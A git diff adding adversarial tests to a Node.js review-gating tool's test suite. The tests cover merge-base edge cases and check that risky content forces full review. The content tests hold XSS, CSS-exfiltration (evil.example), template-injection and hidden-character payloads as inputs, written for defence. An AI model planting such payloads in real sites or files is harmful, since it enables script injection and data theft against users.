@@ -5,7 +5,7 @@ import { chmodSync, existsSync, mkdirSync, readFileSync, readdirSync, rmSync, sy
 import { dirname, join } from 'node:path';
 import { parseConf } from '../lib/conf.mjs';
 import {
-  RULE_REASONS, assertService, commandWords, decide, decideLane, fastSettings, globMatcher, judgeDiff, lanesMedian, measureTicket,
+  RULE_REASONS, assertService, commandWords, contentFinding, decide, decideLane, fastSettings, globMatcher, judgeDiff, lanesMedian, measureTicket,
   median, openingLane, pathFormOk, targetedArgv,
 } from '../lib/fast-lane.mjs';
 import { fileURLToPath } from 'node:url';
@@ -721,4 +721,120 @@ test('the example settings and the docs say every fast-lane key, and nothing fas
   const docs = readFileSync(join(import.meta.dirname, '..', 'docs', 'fast-lane.md'), 'utf8');
   assert.match(docs, /## Threat model: can a risky ticket take the fast lane\?/);
   assert.match(docs, /## What never qualifies/);
+});
+
+// ---- What lands, not what the branch says: the merge the forge would make ----
+
+test('adversarial: a criss-cross history (two merge bases) is not judged; a merge that conflicts is not either; the base\'s own later changes are not the branch\'s', () => {
+  // A at the base; B on the branch, C on main; main merges the branch (D) and the branch merges main (E): two merge bases, B and C.
+  const p = project();
+  const b = p.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello from the branch\n' }));
+  p.git('checkout', '-q', 'main');
+  p.git('checkout', '-q', '-b', 'other');
+  write(p.dir, { 'docs/other.md': 'other\n' });
+  p.git('add', '-A');
+  p.git('commit', '-q', '-m', 'C');
+  const c = p.git('rev-parse', 'HEAD').trim();
+  p.git('checkout', '-q', 'main');
+  p.git('merge', '-q', '--no-ff', '-m', 'D', c);
+  p.git('merge', '-q', '--no-ff', '-m', 'D2', b);
+  p.git('checkout', '-q', 'dev/X-1');
+  p.git('merge', '-q', '--no-ff', '-m', 'E', c);
+  const e = p.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello again\n' }));
+  assert.equal(p.git('merge-base', '--all', 'main', e).trim().split('\n').length, 2, 'the history is criss-cross');
+  assert.deepEqual(judge(p, e), { state: 'full', reasons: ['unreadable'], keep: false });
+  // A conflict with the base: what would land cannot be known before somebody resolves it.
+  const q = project();
+  const mine = q.commit(({ write: w }) => w({ 'docs/guide.md': 'Bonjour\n' }));
+  q.git('checkout', '-q', 'main');
+  write(q.dir, { 'docs/guide.md': 'Hola\n' });
+  q.git('commit', '-q', '-am', 'main changed the same line');
+  q.git('checkout', '-q', 'dev/X-1');
+  assert.deepEqual(judge(q, mine).reasons, ['unreadable']);
+  // What the base gained since is not judged as the branch's change: only the tree that lands is.
+  const r = project();
+  const tiny = r.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello, world\n' }));
+  r.git('checkout', '-q', 'main');
+  write(r.dir, { 'api/server.js': 'export const x = 3;\n' });
+  r.git('commit', '-q', '-am', 'main moved on code');
+  r.git('checkout', '-q', 'dev/X-1');
+  const judged = judge(r, tiny);
+  assert.deepEqual({ state: judged.state, files: judged.files }, { state: 'fast', files: 1 });
+  // And a branch that reverts a file to its old version through a merge from the base is judged by what that merge lands.
+  const s = project();
+  s.git('checkout', '-q', 'main');
+  write(s.dir, { 'api/server.js': 'export const x = 4; // the fix\n' });
+  s.git('commit', '-q', '-am', 'a fix on main');
+  s.git('checkout', '-q', 'dev/X-1');
+  s.git('merge', '-q', '--no-ff', '-m', 'bring main in', 'main');
+  const undone = s.commit(({ write: w }) => w({ 'api/server.js': 'export const x = 1;\n', 'docs/guide.md': 'Hi\n' }));
+  assert.deepEqual(judge(s, undone).reasons, ['outside_safe'], 'the fix undone is seen');
+  // Nothing of the merge is written into the checkout's objects.
+  const before = s.git('count-objects', '-v');
+  judge(s, undone);
+  assert.equal(s.git('count-objects', '-v'), before);
+});
+
+test('adversarial: a safe file that carries behaviour (markup, a remote load, a template, an escape, a handler, hidden characters) takes the full circuit; plain text stays fast', () => {
+  const cases = {
+    'web/app.css': [
+      'body { background: url(https://evil.example/?c=1); }',
+      '@import "https://evil.example/x.css";',
+      'input[value^="a"] { background: URL ( //evil.example/a ) }',
+      '.consent { content: "\\3c script" }',
+      'div { width: expression(alert(1)); }',
+      'a { -moz-binding: x; }',
+      '@font-face { font-family: x; src: local(x) }',
+    ],
+    'web/locales/en.json': [
+      '{"title": "<img src=x onerror=alert(1)>"}',
+      '{"title": "\\u003cimg src=x\\u003e"}',
+      '{"title": "&lt;img src=x&gt;"}',
+      '{"title": "&#60;script&#62;"}',
+      '{"title": "{{constructor.constructor(\'alert(1)\')()}}"}',
+      '{"title": "${process.env.SECRET}"}',
+      '{"title": "#{7*7}"}',
+      '{"title": "{% raw %}"}',
+      '{"link": "java\\tscript:alert(1)"}',
+      '{"link": "javascript:alert(1)"}',
+      '{"link": "data:text/html;base64,PHNjcmlwdD4="}',
+      '{"title": "x\\" onmouseover=\\"alert(1)"}',
+      '{"title": "Prix‮ 0 €"}',
+      '{"title": "Hello​world"}',
+      '{"title": "%3Cscript%3E"}',
+    ],
+    'docs/guide.md': ['Hello <br> world', '[click](javascript:alert(1))', '{{ site.secret }}'],
+  };
+  for (const [file, lines] of Object.entries(cases)) {
+    for (const line of lines) {
+      const p = project();
+      const head = p.commit(({ write: w }) => w({ [file]: `${line}\n` }));
+      const judged = judge(p, head);
+      assert.equal(judged.state, 'full', `${file}: ${line}`);
+      assert.deepEqual(judged.reasons, ['content'], `${file}: ${line}`);
+      assert.match(judged.offending.content, new RegExp(`^${file.replace(/[.]/g, '\\.')} \\(`));
+    }
+  }
+  // Not UTF-8: not read, not fast.
+  const p = project();
+  const bytes = p.commit(({ dir }) => writeFileSync(join(dir, 'docs', 'guide.md'), Buffer.from([0x48, 0xc3, 0x28, 0x0a])));
+  assert.deepEqual(judge(p, bytes).reasons, ['content']);
+  // Only what is gained is read: taking markup out is plain text.
+  const q = project({ 'docs/guide.md': 'Hello <b>world</b>\n' });
+  const removed = q.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello world\n' }));
+  assert.equal(judge(q, removed).state, 'fast');
+  // Plain wording, in every kind of safe file, stays fast: quotes, apostrophes, a colon, braces of a message format, an e-mail address.
+  const r = project();
+  const plain = r.commit(({ write: w }) => w({ 'web/locales/en.json': '{"title": "Don\'t miss: {count} new items", "help": "Write to help@example.com"}\n', 'web/app.css': 'h1 { color: #333; margin: 0 auto; }\n', 'docs/guide.md': 'Prices: see the "Plans" page.\n' }));
+  assert.deepEqual(judge(r, plain).reasons, []);
+  // The project's own forbidden texts, compared without case.
+  const s = project();
+  const price = s.commit(({ write: w }) => w({ 'docs/guide.md': 'Le PRIX est de 0 euro\n' }));
+  assert.deepEqual(judge(s, price, confOf('enabled = yes\nsafe_paths = docs/\nforbidden_text = prix, tarif')).reasons, ['content']);
+  assert.equal(judge(s, price).state, 'fast');
+  assert.throws(() => fastSettings(confOf(`enabled = yes\nforbidden_text = ${'x'.repeat(201)}`)), /forbidden_text/);
+  // A diff whose lines cannot be read whole leaves the content unread: not fast, whatever the rest says.
+  assert.equal(contentFinding(null), 'unread');
+  assert.equal(contentFinding(['plain', null]), 'encoding');
+  assert.equal(judgeDiff([{ path: 'docs/a.md', status: 'A', oldMode: '000000', newMode: '100644', added: 1, deleted: 0, size: 3 }], fastSettings(CONF)).reasons.includes('content'), true);
 });
